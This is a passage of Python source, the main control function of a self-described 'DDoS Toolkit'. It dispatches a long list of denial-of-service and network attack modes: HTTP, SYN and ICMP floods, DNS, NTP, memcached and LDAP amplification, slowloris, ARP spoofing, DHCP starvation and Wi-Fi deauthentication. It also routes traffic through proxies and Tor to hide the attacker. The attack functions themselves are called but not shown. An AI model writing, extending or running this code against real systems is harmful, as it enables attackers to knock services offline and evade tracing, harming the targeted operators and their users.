    print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    stop_event.set()
    sys.exit(0)

async def main() -> None:
    """Main function to coordinate attack execution."""
    # Check for required libraries
    required_libraries = [
        "aiohttp", "asyncio", "argparse", "scapy", "dns", 
        "colorama", "tqdm", "psutil", "requests", "tabulate"
    ]
    
    for lib in required_libraries:
        check_library(lib)

    args = parse_args()

    if args.help or len(sys.argv) == 1:
        display_help()
        sys.exit(0)

    if args.version:
        print(f"DDoS Toolkit version 1.0 | Platform: {sys.platform} | License: MIT")
        sys.exit(0)

    display_banner()

    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if args.interactive:
        print(f"{YELLOW}Interactive mode not yet implemented. Using command-line arguments.{RESET}")

    # Validate arguments
    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        sys.exit(1)

    # Load and validate proxies
    proxies = []
    if args.proxies:
        proxies = load_proxies(args.proxies)
        if proxies:
            proxies = await validate_proxies(proxies)
            if proxies:
                asyncio.create_task(monitor_proxy_health(proxies))
            else:
                print(f"{YELLOW}Warning: No valid proxies available. Continuing without proxies.{RESET}")

    # Handle Tor option
    if args.tor:
        print(f"{GREEN}Routing traffic through Tor network...{RESET}")
        if "127.0.0.1:9050" not in proxies:
            proxies.append("socks5://127.0.0.1:9050")

    target = args.url.split("//")[-1].split("/")[0] if args.url else None

    # Handle scan option
    if args.scan and target:
        if not check_root():
            print(f"{RED}Network scanning requires root privileges.{RESET}")
            sys.exit(1)
            
        target_ip = await resolve_target(target)
        if target_ip:
            run_network_scanner(target_ip)
        else:
            print(f"{RED}Exiting: Target is not reachable.{RESET}")
        sys.exit(0)

    # Handle wifi-deauth option
    if args.wifi_deauth:
        if not check_root():
            print(f"{RED}Wi-Fi deauthentication requires root privileges.{RESET}")
            sys.exit(1)
            
        wifi_deauth(duration=args.duration)
        sys.exit(0)

    # Handle anonymizer option
    if args.anonymizer:
        if not check_root():
            print(f"{RED}Anonymizer requires root privileges.{RESET}")
            sys.exit(1)
            
        run_anonymizer(args.anonymizer)
        sys.exit(0)

    # Validate target for attack modes
    if not args.url and not args.interactive:
        print(f"{RED}Error: Target URL is required for attack modes.{RESET}")
        display_help()
        sys.exit(1)

    # Reset global counters
    global requests_sent, successful_requests, failed_requests
    requests_sent = 0
    successful_requests = 0
    failed_requests = 0
    rps_history.clear()

    # Determine target port
    target_port = args.port
    if not target_port:
        if args.attack_mode in SERVICE_PORTS:
            target_port = SERVICE_PORTS[args.attack_mode]
        else:
            target_port = 80  # Default port

    # Start attack based on mode
    tasks = []
    attack_stats = None
    
    # Determine if we should use detailed status or simple status
    use_detailed_status = args.attack_mode in [
        "http-flood", "slowloris", "http2-flood", "slow-post", "xml-bomb",
        "ntlm-auth-flood", "http-fragmentation", "ws-dos", "quic-flood"
    ]

    # Attack mode selection
    try:
        if args.attack_mode == "http-flood":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    rate_limited_attack(
                        args.url, stop_event, args.pause, args.rate_limit, 
                        proxies, payload_size=args.payload_size
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "slowloris":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    slowloris_attack(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "syn-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=syn_flood, 
                args=(target_ip, target_port, args.duration, args.random_ports)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("SYN flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "icmp-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=icmp_flood, 
                args=(target_ip, args.duration, args.payload_size)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("ICMP flood", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "dns-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=dns_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("DNS amplification", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "ftp-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ftp_flood, 
                args=(target_ip, target_port, args.duration, args.payload_size)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("FTP flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "ssh-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ssh_flood, 
                args=(target_ip, target_port, args.duration, args.payload_size)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("SSH flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "ntp-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ntp_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("NTP amplification", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "memcached-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=memcached_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("Memcached amplification", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "smurf":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=smurf_attack, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("Smurf attack", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "teardrop":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=teardrop_attack, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("Teardrop attack", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "http2-flood":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    http2_flood(
                        args.url, stop_event, args.pause, args.rate_limit, 
                        proxies, payload_size=args.payload_size
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "land-attack":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=land_attack, 
                args=(target_ip, target_port, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("LAND attack", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "ping-of-death":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ping_of_death, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("Ping of Death", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "slow-post":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    slow_post_attack(
                        args.url, stop_event, args.pause, args.rate_limit, 
                        proxies, args.payload_size
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "xml-bomb":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    xml_bomb_attack(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "ntlm-auth-flood":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    ntlm_auth_flood(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "char-gen":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=char_gen_flood, 
                args=(target_ip, target_port, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("CHAR-GEN flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "rst-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=rst_flood, 
                args=(target_ip, target_port, args.duration, args.random_ports)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("RST flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "ack-flood":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ack_flood, 
                args=(target_ip, target_port, args.duration, args.random_ports)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("ACK flood", f"{target_ip}:{target_port}", args.duration)
            ).start()
            
        elif args.attack_mode == "http-fragmentation":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    http_fragmentation_attack(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "ws-dos":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    ws_dos_attack(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "quic-flood":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    quic_flood(
                        args.url, stop_event, args.pause, args.rate_limit, proxies
                    )
                )
                tasks.append(task)
            status_thread = threading.Thread(
                target=display_status, 
                args=(stop_event, args.duration, args.results)
            )
            status_thread.start()
            
        elif args.attack_mode == "arp-spoofing":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            # For ARP spoofing, we need the gateway IP
            gateway_ip = input(f"{YELLOW}Enter gateway IP for ARP spoofing: {RESET}")
            if not is_valid_ip(gateway_ip):
                print(f"{RED}Invalid gateway IP.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=arp_spoof, 
                args=(target_ip, gateway_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("ARP spoofing", f"{target_ip} -> {gateway_ip}", args.duration)
            ).start()
            
        elif args.attack_mode == "dhcp-starvation":
            interface = input(f"{YELLOW}Enter network interface for DHCP starvation: {RESET}")
            threading.Thread(
                target=dhcp_starvation, 
                args=(args.duration, interface)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("DHCP starvation", interface, args.duration)
            ).start()
            
        elif args.attack_mode == "ssdp-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ssdp_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("SSDP amplification", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "snmp-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=snmp_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("SNMP amplification", target_ip, args.duration)
            ).start()
            
        elif args.attack_mode == "ldap-amplification":
            target_ip = await resolve_target(target)
            if not target_ip:
                print(f"{RED}Failed to resolve target.{RESET}")
                sys.exit(1)
                
            threading.Thread(
                target=ldap_amplification, 
                args=(target_ip, args.duration)
            ).start()
            threading.Thread(
                target=simple_status, 
                args=("LDAP amplification", target_ip, args.duration)
            ).start()

        # Wait for attack to complete
        await asyncio.sleep(args.duration)
        stop_event.set()

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        if use_detailed_status:
            stats = calculate_rps_stats()
            print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")

        if args.results:
            print(f"{GREEN}Results saved to {args.results}{RESET}")

        if args.anonymizer == "start":
            print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
            run_anonymizer("stop")

    except Exception as e:
        logger.error(f"Error during attack execution: {e}")
        stop_event.set()
        sys.exit(1)

def calculate_rps_stats() -> Dict[str, float]:
    """Calculate requests-per-second statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

if __name__ == "__main__":
    asyncio.run(main())
